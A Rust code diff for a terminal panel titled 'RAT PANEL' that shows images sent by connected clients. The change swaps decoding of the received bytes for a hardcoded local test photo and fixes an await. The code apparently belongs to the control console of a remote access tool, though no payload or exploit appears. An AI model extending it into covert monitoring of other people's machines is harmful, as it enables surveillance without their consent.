@@ -4,10 +4,10 @@ mod ui;
 mod server;
 
 use app::App;
-use color_eyre::Result;
 use std::error::Error;
 use std::io;
 use std::time::{Duration, Instant};
+use std::io::Cursor;
 
 use crossterm::event::{self, DisableMouseCapture, EnableMouseCapture, KeyCode, Event, EventStream};
 use crossterm::execute;
@@ -23,6 +23,7 @@ use ratatui_image::{
 };
 
 use image::ImageReader;
+use color_eyre::Result;
 use futures::{FutureExt, StreamExt};
 
 use crate::server::ClientEvent;
@@ -46,12 +47,14 @@ fn handle_client_img_event(app: &mut App, event: ClientEvent) -> Result<(), Box<
     match event {
         ClientEvent::Connected(addr) => { app.img_addr = addr.to_string() },
         ClientEvent::Data(bytes) => { 
-            let image = ImageReader::new(
-                std::io::Cursor::new(bytes)
-            )
-            .with_guessed_format()?
-            .decode()?;
+            // let image = ImageReader::new(
+            //     Cursor::new(bytes)
+            // )
+            // .with_guessed_format()?
+            // .decode()?;
 
+            let image = image::open("D:/фото/DSCN4215.jpg")?;
+            
             let protocol = Picker::from_query_stdio()?
                 .new_resize_protocol(image);
 
@@ -88,8 +91,8 @@ pub async fn run(tick_rate: Duration) -> Result<(), Box<dyn Error>> {
     let backend = CrosstermBackend::new(stdout);
     let mut terminal = Terminal::new(backend)?;
 
-    let app = App::new(" ◈ RAT PANEL ");
-    let app_result = run_app(&mut terminal, app.await, tick_rate).await;
+    let app = App::new(" ◈ RAT PANEL ").await;
+    let app_result = run_app(&mut terminal, app, tick_rate).await;
 
     disable_raw_mode()?;
     execute!(
